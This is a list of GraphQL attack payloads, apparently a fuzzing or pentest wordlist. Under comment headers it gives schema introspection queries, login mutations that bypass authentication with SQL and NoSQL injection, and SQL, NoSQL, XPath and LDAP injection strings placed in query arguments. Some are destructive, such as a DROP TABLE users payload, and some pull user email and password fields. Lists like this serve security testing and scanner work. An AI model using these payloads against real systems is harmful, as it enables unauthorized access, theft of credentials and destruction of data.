# === Introspection Queries ===

# Basic introspection
query { __schema { queryType { name } } }
query { __schema { mutationType { name } } }
query { __schema { subscriptionType { name } } }
query { __type(name: "Query") { fields { name } } }
query { __type(name: "User") { fields { name type { name } } } }

# Full introspection (most dangerous)
query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name type { name kind } } } directives { name description } } }

# Type introspection
query { __type(name: "Query") { fields { name description args { name type { name } } } } }
query { __type(name: "Mutation") { fields { name description args { name type { name } } } } }
query { __type(name: "Subscription") { fields { name description } } }

# Enum values introspection
query { __type(name: "Status") { enumValues { name description } } }

# Interface introspection
query { __type(name: "Node") { fields { name } interfaces { name } } }

# Union types
query { __type(name: "SearchResult") { possibleTypes { name } } }

# === Authentication Bypass ===

# Login mutation bypass
mutation { login(input: { email: "admin@localhost", password: "'" }) { token } }
mutation { login(input: { email: "' OR 1=1--", password: "anything" }) { token } }
mutation { login(input: { email: "admin@localhost'--", password: "" }) { token } }

# NoSQL injection in login
mutation { login(input: { email: "{$ne:null}", password: "{$ne:null}" }) { token } }
mutation { login(input: { email: "{\"$ne\":\"\"}", password: "{\"$ne\":\"\"}" }) { token } }

# Boolean-based bypass
mutation { login(input: { email: "\" OR \"1\"=\"1\"", password: "\" OR \"1\"=\"1\"" }) { token } }

# === Injection Payloads ===

# SQL Injection in arguments
query { user(id: "1' OR '1'='1") { id email password } }
query { user(id: "1' UNION SELECT NULL,NULL,NULL--") { id } }
query { users(where: "id=1 OR 1=1--") { id email } }
query { user(id: "1'; DROP TABLE users--") { id } }
query { user(id: "1' AND SLEEP(5)--") { id } }

# NoSQL Injection
query { user(id: "{$ne:null}") { id email } }
query { user(id: "{$gt:' '}") { id } }
query { users(where: "{\"$or\":[{\"id\":\"1\"},{\"id\":\"2\"}]}") { id } }
query { user(id: "'; return db.users.find(); //") { id } }

# XPath Injection
query { user(id: "' or '1'='1") { id } }
query { user(id: "' or 1=1 or ''='") { id } }

# LDAP Injection
query { user(id: "*)(&") { id } }
query { user(id: "*)(uid=*") { id } }
